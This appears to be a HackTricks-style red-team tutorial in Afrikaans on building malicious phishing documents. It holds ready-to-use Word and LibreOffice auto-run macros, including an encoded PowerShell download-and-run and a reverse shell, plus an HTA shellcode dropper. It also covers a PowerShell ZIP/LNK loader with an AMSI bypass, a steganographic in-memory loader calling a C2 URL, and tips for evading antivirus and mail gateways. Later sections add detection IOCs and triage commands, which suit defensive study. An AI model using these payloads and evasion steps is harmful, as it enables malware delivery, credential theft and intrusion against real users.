# Phishing-lêers en dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-dokumente

Microsoft Word valideer lêerdata voordat dit 'n lêer oopmaak. Datavalidering word uitgevoer deur die datastruktuur teen die OfficeOpenXML-standaard te identifiseer. As enige fout tydens die identifisering van die datastruktuur voorkom, sal die lêer wat ontleed word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds die vermoë te behou om macros uit te voer.\
'n RTF-lêer ondersteun byvoorbeeld nie macros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en macros kan uitvoer.\
Dieselfde interne werking en meganismes geld vir alle sagteware in die Microsoft Office-suite (Excel, PowerPoint, ens.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sommige Office-programme uitgevoer gaan word:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-lêers wat na ’n remote template verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros insluit, kan ook macros “uitvoer”.

### Eksterne beeldlaai

Gaan na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Eksterne beeldlaai: Gaan na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Vir die ontleding van ’n ontvangde dokument eerder as om een te skep, sien [VBA-macro-ontleding: gemorskode en UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Macro-agterdeur

Dit is moontlik om macros te gebruik om arbitrêre code vanuit die dokument uit te voer.

#### Outolaai-funksies

Hoe meer algemeen hulle is, hoe waarskynliker is dit dat die AV hulle sal opspoor.

- AutoOpen()
- Document_Open()

#### Voorbeelde van macro-code

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Verwyder metadata handmatig

Gaan na **Lêer > Inligting > Inspekteer dokument > Inspekteer dokument** om die Dokumentinspekteur oop te maak. Klik **Inspekteer** en dan **Verwyder alles** langs **Dokumenteienskappe en persoonlike inligting**.

#### Doc-uitbreiding

Wanneer jy klaar is, kies die **Stoor as tipe**-aftreklys en verander die formaat van **`.docx`** na Word 97-2003 **`.doc`**.\
Doen dit omdat jy **nie makro's binne 'n `.docx` kan stoor nie** en daar **'n stigma rondom** die makro-geaktiveerde **`.docm`**-uitbreiding is (bv. die duimnaelikoon het 'n groot `!` en sommige web-/e-pospoorte blokkeer dit heeltemal). Daarom is hierdie **verouderde `.doc`-uitbreiding die beste kompromie**.

#### Kwaadwillige makrogenerators

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT-outomatiese makro's (Basic)

LibreOffice Writer-dokumente kan Basic-makro's insluit en dit outomaties laat loop wanneer die lêer oopgemaak word deur die makro aan die **Open Document**-gebeurtenis te koppel (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 'n Eenvoudige reverse shell-makro lyk soos volg:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik hulle om letterlike aanhalingstekens te ontsnap, dus bly payloads wat eindig op `...==""")` gebalanseer met beide die binneste opdrag en die Shell-argument.

Afleweringswenke:

- Stoor as `.odt` en koppel die makro aan die dokumentgebeurtenis sodat dit onmiddellik loop wanneer die dokument oopgemaak word.
- Gebruik `--attach @resume.odt` wanneer jy met `swaks` e-pos stuur (die `@` is nodig sodat die lêer se grepe, nie die lêernaamstring nie, as die aanhegsel gestuur word). Dit is krities wanneer SMTP-bedieners misbruik word wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.

## HTA-lêers

’n HTA is ’n Windows-program wat **HTML en skriftale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en word as ’n “volledig vertroude” toepassing uitgevoer, sonder die beperkings van ’n blaaier se sekuriteitsmodel.

’n HTA word met **`mshta.exe`** uitgevoer, wat tipies saam met **Internet Explorer geïnstalleer** word, wat beteken dat **`mshta` van IE afhanklik is**. As dit dus verwyder is, sal HTA’s nie kan uitvoer nie.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Vals aanhegselkaarte in HTML-e-pos

’n HTML-e-pos kan ’n verskaffer se inheemse voorskoukaart vir aanhegsels naboots sonder om ’n werklike aanhegsel te bevat. Talos het ’n Gmail-kaart waargeneem wat uit vier Base64-geënkodeerde ingebedde PNG-MIME-onderdele herbou is. Die volledige visuele element was in een anker toegedraai, en ’n ontvangerwaarde in `?m=<target-id>` het per-ontvangersporing moontlik gemaak. Die skakel het met `//` begin eerder as met `http://` of `https://`; blaaiers verwerk hierdie protokolrelatiewe vorm, maar URL-onttrekkers wat net volledig gekwalifiseerde URL’s herken, kan dit miskyk.<sup>[[11]](#references)</sup>

Inspekteer tydens ontleding die rou MIME eerder as om die weergegewe aanhegsellys te vertrou. Stel vas hoe die ingebedde beeldonderdele die visuele kaart vorm, identifiseer die omringende anker en normaliseer protokolrelatiewe `href`-waardes voordat URL’s onttrek word.<sup>[[11]](#references)</sup>

Vir vervalsing van die afsender in die koevert-/kopskrif en DMARC-belyningstoetsing, sien [teenmaatreëls teen SMTP-posvervalsing](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## NTLM-verifikasie afdwing

Daar is verskeie maniere om NTLM-verifikasie op afstand af te dwing. Jy kan byvoorbeeld **onsigbare beelde** by e-posse of HTML voeg waartoe die gebruiker toegang kry (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat **verifikasie sal aktiveer** bloot deur die **lêergids oop te maak.**

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die verifikasie kan steel nie, maar ook **NTLM relay-aanvalle kan uitvoer**:

- [**NTLM Relay-aanvalle**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Uiters doeltreffende veldtogte lewer ’n ZIP af wat twee wettige lokdokumente (PDF/DOCX) en ’n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell-loader ná ’n unieke merker in die rou grepe van die ZIP gestoor word, en die .lnk dit daaruit haal en volledig in die geheue uitvoer.<sup>[[2]](#references)</sup>

Tipiese vloei wat deur die .lnk PowerShell-eenreëlprogram geïmplementeer word:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData% en die ouergids van die huidige werkdirectory.
2) Lees die ZIP-grepe en vind ’n hardgekodeerde merker (bv. xFIQCV). Alles ná die merker is die ingebedde PowerShell-payload.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit en maak die lok-.docx oop om wettig te lyk.
4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskeer die volgende stadium (bv. verwyder alle #-karakters) en voer dit in die geheue uit.

Voorbeeld van ’n PowerShell-raamwerk om die ingebedde stadium uit te haal en uit te voer:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notes
- Aflewering misbruik dikwels betroubare PaaS-subdomeine (bv. *.herokuapp.com) en kan payloads afskerm (bedien onskadelike ZIP-lêers op grond van IP/UA).
- Die volgende stadium dekripteer dikwels base64/XOR-shellcode en voer dit via Reflection.Emit + VirtualAlloc uit om skyfspore te beperk.

Persistensie wat in dieselfde ketting gebruik word
- COM TypeLib-kaping van die Microsoft Web Browser-beheer, sodat IE/Explorer of enige toepassing wat dit inbed, die payload outomaties weer begin.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-vir-gebruik-opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Jag/IOCs
- ZIP-lêers wat die ASCII-merkerstring (bv. xFIQCV) aan die argiefdata geheg bevat.
- .lnk wat ouer-/gebruikersvouers deursoek om die ZIP op te spoor en ’n lokdokument oopmaak.
- AMSI-peutering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langdurige besigheids-e-posdrade wat eindig met skakels onder vertroude PaaS-domeine.

## .lnk-lokdokument-eerste-stadiëring → geskeduleerde-taak-persistensie → vertroude CPL-sylaaiing

Nog ’n terugkerende patroon is ’n **dokument-nabootsende `.lnk`** wat onmiddellik ’n onskadelike lokdokument oopmaak terwyl dit die werklike ketting in die agtergrond voorberei.<sup>[[3]](#references)</sup>

Waargenome werkvloei:
1. Die kortpad **doen hom as ’n PDF voor** en gebruik `conhost.exe` of ’n soortgelyke instaanprogram om ’n verduisterde PowerShell-aflaaier te begin.
2. PowerShell breek ooglopende tokens op (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) sodat naïewe opsporings wat vir `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die opdrag miskyk.
3. Die stager laai **eers die lokdokument af**, maak dit vir die slagoffer oop en bou daarna die kwaadwillige lêers in die agtergrond weer op.
4. Payloads kan met **rommeluitbreidings** geskryf en daarna hernoem word deur vulkarakters te verwyder, wat die verskyning van ooglopende `.exe` / `.cpl`-artefakte vertraag.
5. Persistensie word gevestig met ’n **taakskeduleerdertaak wat elke minuut loop** en ’n vertroude gasheerbinêr vanaf ’n skryfbare gebruikerspad begin.

Minimale jagleidrade uit hierdie patroon:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

’n Nuttige staging-uitleg om te herken:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Waarom die tweede stadium stealthy is

In die Rapid7-gevallestudie het die geskeduleerde taak **`Fondue.exe`** herhaaldelik vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan geplaas is en **`RunFODW`** uitgevoer het, het die vertroude Microsoft-binêre die aanvaller se CPL side-loaded in plaas van die wettige stelselkopie.

Die CPL:
- Lees ’n **AES-256-CBC**-blob vanaf `C:\Windows\Tasks\editor.dat`
- Ontsyfer dit deur **Windows CNG / `bcrypt.dll`**
- Ken uitvoerbare geheue toe en kopieer die ontsyferde shellcode daarheen
- Voer dit indirek uit deur die shellcode-wyser as die terugroepfunksie vir **`EnumUILanguagesW`** te gebruik

Dié laaste stap is die moeite werd om afsonderlik te ondersoek: malware vermy dikwels ’n direkte `((void(*)())buf)()`-sprong en misbruik eerder ’n **wettige WinAPI wat ’n terugroepfunksie aanvaar** om uitvoering oor te dra.

Die ontsyferde payload in hierdie veldtog was **Donut**-shellcode, wat toe die finale PE volledig in geheue gekarteer en **AMSI/WLDP/ETW** in die huidige proses gepatch het voordat dit uitvoering oorgedra het. Sien die volgende vir meer besonderhede oor side-loading en geheue-inwonende naverwerking:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktiese ondersoekpunte:
- `.lnk` wat `powershell.exe` of `conhost.exe` loods, gevolg deur ’n sigbare lokdokument.
- Kortstondige downloads na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf nonsensuitbreidings.
- Geskeduleerde take met onopvallende name soos `GoogleErrorReport` wat vanaf **gebruiker-skryfbare gidse** uitgevoer word.
- Vertroude binaries wat **`.cpl` / `.dll`**-lêers vanaf dieselfde nie-stelselgids laai.
- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf en dan deur die side-loaded module gelees word.

## Steganografie-afgebakende payloads in beelde (PowerShell-stager)

Onlangse loader-kettings lewer ’n verduisterde JavaScript/VBS wat ’n Base64 PowerShell-stager dekodeer en uitvoer. Dié stager laai ’n beeld af (dikwels GIF) wat ’n Base64-geënkodeerde .NET DLL as gewone teks tussen unieke begin-/eindmerkers versteek. Die script soek na hierdie afbakenings (voorbeelde wat in die natuur waargeneem is: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die teks daartussen, dekodeer dit met Base64 na grepe, laai die assembly in die geheue en roep ’n bekende toegangmetode met die C2-URL aan.<sup>[[5]](#references)</sup>

Werkvloei
- Fase 1: Geargiveerde JS/VBS-dropper → dekodeer ingebedde Base64 → loods PowerShell-stager met -nop -w hidden -ep bypass.
- Fase 2: PowerShell-stager → laai beeld af, onttrek merker-afgebakende Base64, laai die .NET DLL in die geheue en roep sy metode aan (bv. VAI) met die C2-URL en opsies.
- Fase 3: Loader haal die finale payload op en injecteer dit gewoonlik via process hollowing in ’n vertroude binêre (dikwels MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Sien hier meer oor process hollowing en die uitvoering van proxy-prosesse via vertroude nutsprogramme:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om ’n DLL uit ’n beeld te onttrek en ’n .NET-metode in die geheue aan te roep:

<details>
<summary>PowerShell-stego-payload-onttrekker en loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notas
- Dit is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Merkers verskil tussen veldtogte.
- AMSI/ETW-bypass en string-deobfuscation word algemeen toegepas voordat die assembly gelaai word.
- Opsporing: skandeer afgelaaide beelde vir bekende skeidingstekens; identifiseer PowerShell wat toegang tot beelde kry en Base64-blobs onmiddellik dekodeer.

Sien ook stego-gereedskap en carving-tegnieke:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-droppers → Base64 PowerShell-staging

’n Terugkerende aanvanklike stadium is ’n klein, sterk geobfuskeerde `.js`- of `.vbs`-lêer wat binne ’n argief afgelewer word. Die enigste doel daarvan is om ’n ingebedde Base64-string te dekodeer en PowerShell met `-nop -w hidden -ep bypass` te begin om die volgende stadium oor HTTPS te aktiveer.<sup>[[5]](#references)</sup>

Basiese logika (abstrak):
- Lees die inhoud van die eie lêer
- Vind ’n Base64-blob tussen rommelstringe
- Dekodeer dit na ASCII PowerShell
- Voer dit uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` aanroep

Opsporingsleidrade
- Geargiveerde JS/VBS-aanhegsels wat `powershell.exe` begin met `-enc`/`FromBase64String` in die opdragreël.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf tydelike gebruikersgidspaaie begin.

## MSC-dokumente as uitvoeringshouers (GrimResource)

Microsoft Management Console-lêers (`.msc`) is XML-konsoledefinisies wat normaalweg deur `mmc.exe` oopgemaak word. **GrimResource** bewapen ’n `StringTable`-verwysing na ’n `apds.dll`-hulpbron wat ’n ou XSS-primitief bevat, sodat JavaScript binne `mmc.exe` loop wanneer ’n gebruiker die vervaardigde konsole oopmaak. Waargenome voorbeelde het `transformNode`-gebaseerde obfuscation met **DotNetToJScript** gekombineer om ’n .NET-payload te instansieer sonder die gewone Office-macro-pad.<sup>[[9]](#references)</sup>

Behandel ’n MSC-lêer wat nie vertrou word nie as teks tydens statiese triage en **moenie daarop dubbelklik nie**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Runtime-pivots met ’n hoë seinwaarde is `mmc.exe` wat die CLR- of scriptkomponente laai, netwerkverbindings skep, of `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` of ’n onverwagte uitvoerbare lêer begin. Die formaat is legitiem, dus behoort detections **oorsprong + verdagte XML-/scriptinhoud + `mmc.exe`-gedrag** te korreleer eerder as om elke MSC te blokkeer.<sup>[[9]](#references)</sup>

## PDF/QR-redirectors en payload-gating

’n PDF hoef nie ’n exploit te bevat om bruikbaar te wees nie. Onlangse veldtogte plaas ’n **QR-kode of gewone skakel** in ’n dokument wat onskuldig lyk, lei die blaaiersessie weg van e-posbeheermaatreëls en pas die bestemming aan met die ontvanger se e-posadres. Microsoft het PDFs uit 2025 gedokumenteer waarvan die QR-URL’s uniek per ontvanger was en na RaccoonO365-infrastruktuur vir die oes van aanmeldbewyse gelei het; ’n parallelle ketting het IP-/omgewings-gating gebruik om ’n JavaScript-/MSI-pad aan geselekteerde besoekers te verskaf, maar ’n onskadelike PDF aan skandeerders of kliënte wat nie toegelaat is nie.<sup>[[10]](#references)</sup>

Triageer beide PDF-aksies en gerenderde QR-kodes. ’n QR-kode kan as vektorgrafika geteken wees eerder as as ’n onttrekbare prent gestoor word, dus rasteriseer elke bladsy en onttrek ook die ingebedde prente:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspekteer gedekodeerde bestemmings en herleidings vanaf ’n geïsoleerde ontledingstelsel sonder om te staaf. Nuttige jagkenmerke sluit in PDF’s wat slegs QR-kodes bevat met byna leë e-posboodskappe, die ontvanger se e-posadres wat in ’n navraagparameter ingebed is, verskeie herleidings via betroubare gasheerdienste, en verskillende inhoud wat volgens IP, geoligging, koekies, verwysingsadres of gebruikersagent teruggestuur word. Vergelyk versoeke met beheerde profiele, want ’n enkele sandbox-ophaalversoek kan net die lokmiddel ontvang.<sup>[[10]](#references)</sup>

## Windows-lêers om NTLM-hashes te steel

Kyk na die bladsy oor **plekke om NTLM-creds te steel**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-makro → IIS-webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-veldtog: ’n Gesofistikeerde phishing-aanval wat Amerikaanse maatskappye teiken](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Opsporing van Dropping Elephant se tradecraft deur ’n China-tema-loaderketting](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Kaping van die TypeLib – Nuwe COM-volhardingstegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI-loader lewer ’n reeks infostealers af](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console vir aanvanklike toegang en ontduiking](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Bedreigingsakteurs buit belastingseisoen uit om phishing-veldtogte met ’n belastingtema te loods](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587-afleweringsketting en Antino-backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
